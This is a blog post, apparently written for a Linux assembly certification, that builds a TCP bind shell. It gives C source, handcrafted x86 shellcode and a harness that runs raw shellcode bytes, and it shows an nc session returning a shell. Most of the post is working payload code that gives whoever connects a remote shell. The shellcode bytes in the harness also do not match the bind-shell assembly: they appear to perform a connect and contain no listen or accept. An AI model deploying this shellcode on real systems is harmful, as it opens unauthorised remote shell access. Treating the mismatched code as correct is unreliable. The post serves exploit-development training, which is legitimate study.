---
layout: post
title: Bind Shell TCP
categories: [re,exploit]
tags: [slae, osce]
fullview: false
comments: true
---
# Assignment #1
> This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
> http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
> Student ID: SLAE-1228


Since I first accomplished Assignment 2 (Reverse Shell TCP) instead of Assignment 1, all the networking and programming related topics had already been reviewd.

Indeed, both assignments are very simmilar. Most of the differences are concerned to the envolved functions. While in a Reverse Shell we basically built a TCP client socket, in a Bind Shell we will work on something like a server.

## listen()
After creating the socket and binding it to a port, we will now have it listening instead of actively connecting.

	int listen(int socket, int queueLimit)

Since we are expecting a single connection, our queueLimit is 0.

## accept()
Once the socket is listening, we now wait for new connections. It is common to have this function inside an infinite loop, so the socket can handle multiple connections. 
	
	int accept(int socket, struct sockaddr *clientAddress, unsigned int *addressLength)

Although this is not the case here, it should be noticed the function will return a new file descriptor to our single connection. Just like when we created the socket, we will have to save it in a stable register so we can use it later in our dup2 function.

## dup2() and execve()
When someone connects to this socket and it is accepted we are able to redirect INPUT, OUTPUT and ERROR to the new client socket and finally pop a shell with execve. This is very simmilar to what we did in Assignment 2, so I will skip it.

## Working TCP server
In order to create the simplest client possible, we cut all the error corrections. This is for **educational purposes only** and should NEVER be used in production.

```
 #include<stdio.h> //printf
 #include<string.h>    //strlen
 #include<sys/socket.h>    //socket
 #include<arpa/inet.h> //inet_addr
 
 int main(int argc , char *argv[]){
 
     int sock;
     int clntSock;
     struct sockaddr_in server;
     struct sockaddr_in client;
 
     server.sin_addr.s_addr = INADDR_ANY;
     server.sin_family = AF_INET;
     server.sin_port = htons( 8888 );
 
     sock = socket(AF_INET , SOCK_STREAM , 0);
     //int bind(int socket, struct sockaddr *localAddress, unsigned int addressLength) 
     bind(sock, (struct sockaddr *)&server, sizeof(server));
 
     //int listen(int socket, int queueLimit)
     listen(sock, 0);
 
     //int accept(int socket, struct sockaddr *clientAddress, unsigned int *addressLength)
     clntSock = accept(sock, NULL, NULL);
 
     dup2(clntSock, 0);
     dup2(clntSock, 1);
     dup2(clntSock, 2);
 
     execve("/bin/sh", 0, 0);
 
     return 0;
 }
```

## Handcrafted shellcode

Once again, my idea here is not to generate a small shellcode, but a comprehensible one. It was pretty simple to modify the reverse shell code to this one, given the only significant changes are those related to the new syscalls.

```
global _start

section .text
_start:

;###socket###
;socket(AF_INET , SOCK_STREAM , 0);

xor eax, eax
mov al, 0x66 ;socketcall
xor ebx, ebx

;push the list of arguments onto the stack
push ebx ;PROT
push 0x01 ;SOCK_STREAM
push 0x02 ;AF_INET

mov bl, 0x01 ;socket function

mov ecx, esp ;pass the pointer to the list of arguments to ecx

int 0x80
mov edi, eax ; save socket fd into edi (eax may change!)

;###bind###

;struct sockaddr_in {
;	unsigned short  sin_family;     /*  Internet protocol (AF_INET) */
;	unsigned short  sin_port;       /* Address port (16 bits) */
;	struct in_addr sin_addr;        /*  Internet address (32 bits) */
;	char sin_zero[8];               /* Not used */
;};
;
;struct in_addr {
;	unsigned long s_addr;  // load with inet_aton()
;};
push 0x0101017f 
push word 0xb822 ; sin_port=8888 
push word 0x02

mov esi, esp ;save the pointer to the struct in esi

;bind syscall
;int connect(int socket, struct sockaddr *foreignAddress, unsigned int addressLength)
xor eax, eax
mov al, 0x66 ;socketcall
xor ebx, ebx
mov bl, 0x02 ;bind

push 0x10 ;addressLength=16bytes. short+short+8+long=2+2+8+4=16
push esi ;address of the struct 
push edi ;socket fd

mov ecx, esp ;pass the pointer to the list of arguments to ecx
int 0x80

;###listen###
xor eax, eax
push eax
mov al, 0x66 ;socketcall
xor ebx, ebx
mov bl, 0x04 ;listen function
push edi

mov ecx, esp
int 0x80

;###accept###
xor eax, eax
xor ebx, ebx
xor ecx, ecx
push eax ;NULL
push eax ;NULL
push edi

mov al, 0x66 ;socketcall
mov bl, 0x05 ;accept function

mov ecx, esp
int 0x80

mov esi, eax ;save the client socket fd into esi

;###copy file descriptors###
;dup2(clntSock, 0);
;dup2(clntSock, 1);
;dup2(clntSock, 2);

push byte 0x3f ;dup2
pop eax
mov ebx, esi
xor ecx, ecx

int 0x80

push byte 0x3f
pop eax
inc ecx

int 0x80

push byte 0x3f
pop eax
inc ecx

int 0x80

;###execve###
xor eax, eax
mov al, 0x0b ;sys_execve
xor ebx, ebx 
push ebx ;terminate string with \0
push 0x68732f2f ;String "hs//"
push 0x6e69622f;String "nib/"
mov ebx, esp

xor ecx, ecx
xor edx, edx

int 0x80
```

## Testing
Using the [test skelleton code](https://marcosvalle.github.io/osce/2018/05/03/testing-shellcode.html) slightly modified so the port and the IP address are configurable:

```
#include <stdio.h>

/*
 ipaddr 127.1.1.1 (0101017f)
 port 8888 (b822)
*/
#define IPADDR "\x7f\x01\x01\x01"
#define PORT "\x22\xb8"

unsigned char *shellcode ="\x6a\x66\x58\x31\xdb\x53\x43\x53\x43\x53\x4b\x89\xe1\xcd\x80\x89\xc7\x68"IPADDR"\x66\x68"PORT"\x66\x6a\x02\x89\xe6\x6a\x66\x58\x6a\x03\x5b\x6a\x10\x56\x57\x89\xe1\xcd\x80\x6a\x3f\x58\x89\xfb\x31\xc9\xcd\x80\x6a\x3f\x58\x6a\x01\x59\xcd\x80\x6a\x3f\x58\x41\xcd\x80\x6a\x0b\x58\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80";

 
 int main(){
     int (*ret)();
     ret = (int(*)())shellcode;
     ret();
 
     return 0;
}
```

Compiling it with:

    $ gcc -m32 test.c -o test

Now running it:

    $ ./test


And connecting from another terminal:

```
$ nc 127.1.1.1 8888
whoami 
valle
```
